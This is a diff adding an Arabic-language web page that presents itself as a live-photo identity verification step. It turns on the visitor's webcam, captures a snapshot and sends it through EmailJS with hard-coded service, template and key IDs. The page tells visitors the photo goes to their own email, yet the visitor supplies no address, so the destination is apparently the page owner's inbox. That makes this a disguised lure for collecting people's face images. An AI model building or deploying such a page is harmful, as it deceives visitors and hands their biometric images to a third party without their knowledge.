@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق بالصورة المباشرة</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f1f5f9; 
+            text-align: center; 
+            padding: 40px 20px; 
+        }
+        .card { 
+            max-width: 450px; 
+            background: white; 
+            margin: auto; 
+            padding: 30px; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.05); 
+        }
+        h2 { color: #0f172a; margin-bottom: 10px; }
+        p { color: #475569; font-size: 14px; margin-bottom: 20px; }
+        video, canvas { 
+            width: 100%; 
+            max-width: 380px; 
+            background: #000; 
+            border-radius: 12px; 
+            margin-bottom: 20px; 
+        }
+        canvas { display: none; } 
+        .btn { 
+            font-size: 16px; 
+            padding: 14px 28px; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-weight: bold; 
+            width: 100%;
+            transition: all 0.3s;
+        }
+        .btn-capture { background-color: #059669; color: white; }
+        .btn-capture:hover { background-color: #047857; }
+        .btn:disabled { background-color: #cbd5e1; cursor: not-allowed; }
+        #status { 
+            margin-top: 15px; 
+            font-weight: 600; 
+            color: #475569; 
+            font-size: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>🛡️ توثيق الهوية بالصورة المباشرة</h2>
+    <p>اضغط على الزر لالتقاط صورة التحقق وسيتم إرسالها فوراً إلى إيميلك الشخصي.</p>
+    
+    <video id="webcam" autoplay playsinline></video>
+    <canvas id="photoCanvas"></canvas>
+    
+    <button id="actionBtn" class="btn btn-capture">📸 التقاط صورة التحقق</button>
+    
+    <div id="status">الحالة: جاري تشغيل الكاميرا...</div>
+</div>
+
+<script>
+    // الـ Public Key الخاص بك مدمج وجاهز
+    emailjs.init("NldFZdDAQmnH3SYbw");
+
+    const webcam = document.getElementById('webcam');
+    const canvas = document.getElementById('photoCanvas');
+    const actionBtn = document.getElementById('actionBtn');
+    const status = document.getElementById('status');
+    const ctx = canvas.getContext('2d');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => { 
+            webcam.srcObject = stream; 
+            status.innerText = "الحالة: الكاميرا جاهزة ونشطة";
+        })
+        .catch(err => { 
+            status.innerText = "خطأ: يرجى إعطاء صلاحية الكاميرا للمتصفح."; 
+            status.style.color = "#ef4444";
+        });
+
+    actionBtn.addEventListener('click', () => {
+        status.innerText = "جاري التقاط الصورة وتجهيزها... 📸";
+        status.style.color = "#059669";
+        actionBtn.disabled = true;
+
+        canvas.width = webcam.videoWidth || 640;
+        canvas.height = webcam.videoHeight || 480;
+        
+        ctx.drawImage(webcam, 0, 0, canvas.width, canvas.height);
+        
+        const imageDataUrl = canvas.toDataURL('image/jpeg', 0.6);
+        
+        sendDirectToEmail(imageDataUrl);
+    });
+
+    function sendDirectToEmail(dataUrl) {
+        status.innerText = "جاري إرسال الصورة مباشرة إلى بريدك الإلكتروني... 🚀";
+        status.style.color = "#d97706";
+
+        const templateParams = {
+            video_file: dataUrl 
+        };
+
+        // الـ Template ID الجديد (template_suh7bnh) مكتوب هنا ومظبوط ومستعد للإرسال! ✅
+        emailjs.send('service_nrcny6x', 'template_suh7bnh', templateParams)
+            .then(response => {
+                status.innerText = "تمت عملية التوثيق بنجاح! تفقد بريدك الآن. ✅";
+                status.style.color = "#16a34a";
+            })
+            .catch(error => {
+                console.error("EmailJS Error:", error);
+                status.innerText = "فشل في إرسال البريد.";
+                status.style.color = "#ef4444";
+            })
+            .finally(() => {
+                actionBtn.disabled = false;
+            });
+    }
+</script>
+</body>
+</html>
